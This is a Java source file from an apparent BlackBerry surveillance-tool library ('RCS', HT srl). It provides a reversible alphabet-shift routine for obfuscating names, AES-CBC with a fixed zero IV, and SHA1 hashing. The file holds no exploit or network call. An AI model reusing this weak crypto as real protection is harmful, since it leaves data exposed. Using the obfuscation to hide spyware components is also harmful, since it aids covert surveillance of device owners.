/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Encryption.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.crypto;

import net.rim.device.api.crypto.HMAC;
import net.rim.device.api.crypto.HMACKey;
import net.rim.device.api.crypto.MACOutputStream;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.Arrays;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public class Encryption {

    private static Debug debug = new Debug("Encryption", DebugLevel.VERBOSE);

    /**
     * Descrambla una stringa, torna il puntatore al nome descramblato. La
     * stringa ritornata va liberata dal chiamante con una free()!!!!
     */
    public static String decryptName(String Name, int seed) {
        return scramble(Name, seed, false);
    }

    /**
     * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
     * ritornata va liberata dal chiamante con una free()!!!!
     */
    public static String encryptName(String Name, int seed) {
        return scramble(Name, seed, true);
    }

    public static int getNextMultiple(int len) {
        Check.requires(len >= 0, "len < 0");
        int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
        Check.ensures(newlen >= len, "newlen < len");
        Check.ensures(newlen % 16 == 0, "Wrong newlen");
        return newlen;
    }

    /**
     * Questa funzione scrambla/descrambla una stringa e ritorna il puntatore
     * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
     * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
     * a FALSE descrambla.
     */
    private static String scramble(String Name, int seed, boolean enc) {
        char[] ret_string = Name.toCharArray();
        int len = Name.length();
        int i, j;

        char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T', 'k',
                'K', 'D', 'M', 'f', 'O', 'z', 'Q', 'A', 'S', 'x', '4', 'V',
                'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l', 'J',
                'W', 'h', 'j', '0', 'm', '5', 'o', '2', 'E', 'r', 'L', 't',
                '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3', 'P',
                'p', 'c', '7', 'g', '-', 'C' };

        int ALPHABET_LEN = alphabet.length;

        if (seed < 0) {
            seed = -seed;
        }

        // Evita di lasciare i nomi originali anche se il byte e' 0
        seed = (seed > 0) ? seed %= ALPHABET_LEN : seed;

        if (seed == 0) {
            seed = 1;
        }

        Check.asserts(seed > 0, "negative seed");

        for (i = 0; i < len; i++) {
            for (j = 0; j < ALPHABET_LEN; j++) {
                if (ret_string[i] == alphabet[j]) {
                    // Se crypt e' TRUE cifra, altrimenti decifra
                    if (enc) {
                        ret_string[i] = alphabet[(j + seed) % ALPHABET_LEN];
                    } else {
                        ret_string[i] = alphabet[(j + ALPHABET_LEN - seed)
                                % ALPHABET_LEN];
                    }

                    break;
                }
            }
        }

        return new String(ret_string);
    }

    Rijndael aes;

    boolean keyReady = false;

    public Encryption() {
        aes = new Rijndael();
    }

    public byte[] decryptData(byte[] cyphered) {
        return decryptData(cyphered, cyphered.length, 0);
    }

    public byte[] decryptData(byte[] cyphered, int offset) {
        return decryptData(cyphered, cyphered.length - offset, offset);
    }

    public byte[] decryptData(byte[] cyphered, int plainlen, int offset) {
        int enclen = cyphered.length - offset;

        Check.requires(keyReady, "Key not ready");
        Check.requires(enclen % 16 == 0, "Wrong padding");
        Check.requires(enclen >= plainlen, "Wrong plainlen");

        byte[] plain = new byte[plainlen];
        byte[] iv = new byte[16];

        byte[] pt = new byte[16];

        // int lastTurn = enclen / 16;

        for (int i = 0; i < enclen / 16; i++) {
            byte[] ct = Arrays.copy(cyphered, i * 16 + offset, 16);

            aes.decrypt(ct, pt);
            xor(pt, iv);
            iv = Arrays.copy(ct);

            if ((i + 1 >= enclen / 16) && (plainlen % 16 != 0)) { // last turn
                // and remaind
                int lastBlockLen = plainlen % 16;
                debug.trace("lastBlockLen: " + lastBlockLen);
                Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
            } else {
                Utils.copy(plain, i * 16, pt, 0, 16);
                // copyblock(plain, i, pt, 0);
            }
        }

        Check.ensures(plain.length == plainlen, "wrong plainlen");
        return plain;
    }

    public byte[] encryptData(byte[] plain) {
        Check.requires(keyReady, "Key not ready");

        int len = plain.length;
        int clen = getNextMultiple(len);

        // TODO: optimize, non creare padplain, considerare caso particolare
        // ultimo blocco
        byte[] padplain = new byte[clen];

        byte[] crypted = new byte[clen];

        Utils.copy(padplain, plain, len);

        byte[] iv = new byte[16]; // iv e' sempre 0

        byte[] ct = new byte[16];

        for (int i = 0; i < clen / 16; i++) {
            byte[] pt = Arrays.copy(padplain, i * 16, 16);
            xor(pt, iv);
            aes.encrypt(pt, ct);

            Utils.copy(crypted, i * 16, ct, 0, 16);

            iv = Arrays.copy(ct);
        }

        return crypted;
    }

    public void makeKey(byte[] key) {
        Check.requires(key != null, "key null");
        Check.requires(key.length == 16, "key not 16 bytes long");
        aes.makeKey(key, 128);

        keyReady = true;
    }

    void xor(byte[] pt, byte[] iv) {
        Check.requires(pt.length == 16, "pt not 16 bytes long");
        Check.requires(iv.length == 16, "iv not 16 bytes long");

        for (int i = 0; i < 16; i++) {
            pt[i] ^= iv[i];
        }
    }

    /**
     * Calcola il SHA1 del messaggio, usando la crypto api
     * @param message
     * @return
     */
    public static byte[] SHA1(byte[] message) {
        SHA1Digest digest = new SHA1Digest();
        digest.update(message);
        byte[] sha1 = digest.getDigest();

        debug.trace("SHA1: " + Utils.byteArrayToHex(sha1));
        return sha1;
    }

}
